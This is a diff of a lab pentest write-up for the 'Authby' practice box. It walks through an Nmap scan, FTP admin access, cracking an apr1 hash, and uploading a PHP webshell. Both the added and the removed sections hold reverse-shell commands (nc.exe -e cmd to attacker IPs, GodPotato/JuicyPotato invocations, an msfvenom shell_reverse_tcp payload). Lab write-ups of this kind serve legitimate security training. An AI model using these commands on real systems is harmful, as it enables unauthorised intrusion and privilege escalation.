@@ -1,79 +1,125 @@
 # Authby
 
-<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+## Pentest Report for Authby
 
-After scanning for open ports, i saw that i had ftp anonymous with plenty of files, let's see if there are some interesting stuff, i did not find anything interesting accesible&#x20;
+### Basic Information
 
-<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+* **Box name**: Authby
+* **IP address**: 192.168.169.46
+* **Operating system**: Windows
+* **Date**: 3/24/2025
 
-But it does not work for the moment but i'm able to connect as admin:
+### Pentest Phases
 
-<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+#### 1. Reconnaissance
 
-{% embed url="https://hackviser.com/tactics/pentesting/services/ftp#reverse-shell-over-website" %}
+* Initial Nmap scan: `nmap -sC -sV -oA initial 192.168.169.46`
+* Full scan: `nmap -p- --min-rate 10000 -oA full 192.168.169.46`
+* Service version verification
 
-I'm able to upload a shell:
+<figure><img src="../../../.gitbook/assets/image (302).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+#### 2. Enumeration
 
-In the admin share we got .htpasswd file:
+* Enumeration of users, groups, and other relevant information
+* Search for known vulnerabilities for identified services
 
-<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+Ok so in our scan we got some interesting stuff, we're going to try and abuse one of the FTP services:
 
-and we're able to crack the hash to admin:elite
+Ftp anonymous connection is enabled -> no interesting informations
 
-looking at the web service:
+I am able to connect as admin:
 
-<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (303).png" alt=""><figcaption></figcaption></figure>
 
-and we are able to log in:&#x20;
+I download every files in the admin share and discover a hash:
 
-<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (304).png" alt=""><figcaption><p>offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0</p></figcaption></figure>
 
-and i'm able to get a ping back:
+#### 3. Exploitation
 
-<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+* Exploitation attempts of discovered vulnerabilities
+* Initial access to the target
 
-but no persistent shell so i need to make a better work
+it's hashcat mode 1600:
 
-so i download this:
+<figure><img src="../../../.gitbook/assets/image (305).png" alt=""><figcaption></figcaption></figure>
 
-{% embed url="https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985" %}
+<figure><img src="../../../.gitbook/assets/image (306).png" alt=""><figcaption></figcaption></figure>
 
-and we're able to pop a webshell:
-
-<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
-
-I tried running reverse shell commands and php and C and powershell but it was not&#x20;
-
-<figure><img src="../../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
-
-so i transfered nc.exe to the target and used it to make a bind shell:
-
-<figure><img src="../../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
-
-since it's windows i have to bind to a cmd shell:
+another thing to note is when i connect with admin:admin i am able to upload php shell:
 
 ```
-nc.exe 192.168.49.54 1234 -e cmd
+ftp> put shell.php
+local: shell.php remote: shell.php
+229 Entering Extended Passive Mode (|||2064|)
+150 File status okay; about to open data connection.
+100% |*************************************************|  5496       23.29 MiB/s    00:00 ETA
+226 Closing data connection.
+5496 bytes sent in 00:00 (68.09 KiB/s)
+ftp> dir
+229 Entering Extended Passive Mode (|||2065|)
+150 Opening connection for /bin/ls.
+total 9
+-r--r--r--   1 root     root         5496 Mar 24 22:34 shell.php
+-r--r--r--   1 root     root           76 Nov 08  2011 index.php
+-r--r--r--   1 root     root           45 Nov 08  2011 .htpasswd
+-r--r--r--   1 root     root          161 Nov 08  2011 .htaccess
+226 Closing data connection.
+ftp> 
 ```
 
-<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
-
-<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
-
-<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
-
-It does not work and we see that this is a 32 bit system with the systeminfo command:
-
-<figure><img src="../../../.gitbook/assets/image (252).png" alt=""><figcaption></figcaption></figure>
-
-So i download juicy potato 32 bit and netcat:
-
-{% embed url="https://github.com/k4sth4/Juicy-Potato/tree/main/x86" %}
+but the php shell does not work so i upload nc exe and a php webshell and manage to get a webshell ->
 
 ```
-C:\Temp>.exe -l 1360 -p c:\windows\system32\cmd.exe -a "/c c:\Temp\nc.exe -e cmd.exe 192.168.49.63 4444" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
+http://192.168.169.46:242/webshell.php?cmd=whoami
 ```
 
-<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+So for my reverse shell i set up a listener and enter:
+
+```
+http://192.168.169.46:242/webshell.php?cmd=nc.exe+192.168.45.228+80+-e+cmd
+```
+
+and get my reverse shell
+
+#### 4. Post-Exploitation
+
+* Access persistence
+* Privilege escalation
+* Sensitive data extraction
+
+After a quick whoami /priv i see that i have impersonate privileges so i start exploitation ->
+
+God potato does not work:
+
+```
+.\GodPotato-NET4.exe -cmd "nc.exe -e cmd 192.168.45.228 9876"
+```
+
+I already had this issue so i'll use printspoofer:
+
+and i got the error:
+
+```
+This version of C:\wamp\www\PrintSpoofer.exe is not compatible with the version of Windows you're running.
+```
+
+so i try juicy potato and start by uploading the executable and a shell.exe that i crafted:
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LPORT=4444 LHOST=192.168.45.228 -f exe -o shell.exe
+```
+
+
+
+
+
+#### 5. Cleanup
+
+* Removal of artifacts from the target
+* Documentation of vulnerabilities and exploitation methods
+
+### Detected Services
+
+_To add details about specific services, use the Exploitation Templates page._
